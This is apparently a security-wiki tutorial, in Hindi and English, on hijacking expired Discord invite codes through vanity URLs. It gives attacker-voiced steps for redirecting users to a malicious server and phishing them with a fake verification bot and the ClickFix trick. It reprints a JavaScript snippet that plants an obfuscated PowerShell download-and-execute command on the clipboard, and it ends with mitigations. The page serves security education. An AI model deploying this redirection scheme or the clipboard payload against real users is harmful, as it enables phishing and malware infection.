# Discord Invite Hijacking

Discord invite hijacking, custom vanity links के reuse rules का दुरुपयोग करता है: एक expired temporary invite code, या केवल lowercase letters और digits से बना deleted permanent code, Level 3 Boost वाले server पर vanity link के रूप में register किया जा सकता है। इसी तरह, जब original server अपना Level 3 Boost खो देता है, तो custom vanity link उपलब्ध हो सकता है; uppercase temporary invite के लिए, attacker lowercase vanity form को पहले से register कर सकता है, जबकि regular invite सक्रिय रहता है, लेकिन redirection केवल उस invite के expire होने के बाद शुरू होता है।<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Invite type के अनुसार observed risk अलग होता है:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Expiration के बाद code उपलब्ध हो जाता है और boosted server द्वारा vanity URL के रूप में फिर से register किया जा सकता है। |
| Permanent Invite Link | ⚠️          | यदि इसे delete कर दिया जाए और यह केवल lowercase letters और digits से बना हो, तो code फिर से उपलब्ध हो सकता है।        |
| Custom Vanity Link    | ✅          | यदि original server अपना Level 3 Boost खो देता है, तो उसका vanity invite नए registration के लिए उपलब्ध हो जाता है।    |

## Exploitation Steps

1. Reconnaissance
- Public sources (forums, social media, Telegram channels) पर `discord.gg/{code}` या `discord.com/invite/{code}` pattern से मेल खाने वाले invite links monitor करें।<sup>[[1]](#references)</sup>
- रुचि वाले invite codes (temporary या vanity) collect करें।<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost privileges वाला Discord server create करें या किसी existing server का उपयोग करें।<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL** में target invite code assign करने का प्रयास करें। यदि यह स्वीकार हो जाता है, तो code malicious server द्वारा reserve कर लिया जाता है।<sup>[[1]](#references)</sup>
3. Hijack Activation
- Temporary invites के लिए, original invite के expire होने तक प्रतीक्षा करें (या यदि source पर आपका control है, तो उसे manually delete करें)।<sup>[[1]](#references)</sup>
- Uppercase वाले codes के लिए, lowercase variant को तुरंत claim किया जा सकता है, हालांकि redirection केवल expiration के बाद activate होता है।<sup>[[1]](#references)</sup>
4. Silent Redirection
- Hijack active होने के बाद, पुराने link पर जाने वाले users को seamlessly attacker-controlled server पर भेज दिया जाता है।<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Server channels को इस तरह restrict करें कि केवल **#verify** channel दिखाई दे।<sup>[[1]](#references)</sup>
2. नए users को OAuth2 के माध्यम से verify करने के लिए prompt करने वाला bot (जैसे, **Safeguard#0786**) deploy करें।<sup>[[1]](#references)</sup>
3. Bot users को CAPTCHA या verification step के बहाने phishing site (जैसे, `captchaguard.me`) पर redirect करता है।<sup>[[1]](#references)</sup>
4. **ClickFix** UX trick implement करें:<sup>[[1]](#references)</sup>
- एक broken CAPTCHA message दिखाएं।
- Users को **Win+R** dialog खोलने, preloaded PowerShell command paste करने और Enter दबाने के लिए guide करें।

### ClickFix Clipboard Injection Example

Campaign ने clipboard पर malicious PowerShell command copy करने के लिए JavaScript का उपयोग किया:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
यह तरीका direct file downloads से बचता है और user का संदेह कम करने के लिए परिचित UI elements का लाभ उठाता है।<sup>[[1]](#references)</sup>

## Mitigations

- permanent invite links को प्राथमिकता दें और सुनिश्चित करें कि code में कम से कम एक uppercase letter हो; uppercase letters वाले deleted permanent codes को vanity links के रूप में दोबारा उपयोग नहीं किया जा सकता।<sup>[[1]](#references)</sup>
- Invite codes को नियमित रूप से rotate करें और पुराने links revoke करें।
- Discord server boost status और vanity URL claims की निगरानी करें।<sup>[[1]](#references)[[2]](#references)</sup>
- Users को server authenticity verify करने और clipboard से paste किए गए commands को execute करने से बचने के लिए educate करें।

## References

- [1] [Trust से Threat तक: Hijacked Discord Invites का Multi-Stage Malware Delivery के लिए उपयोग](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
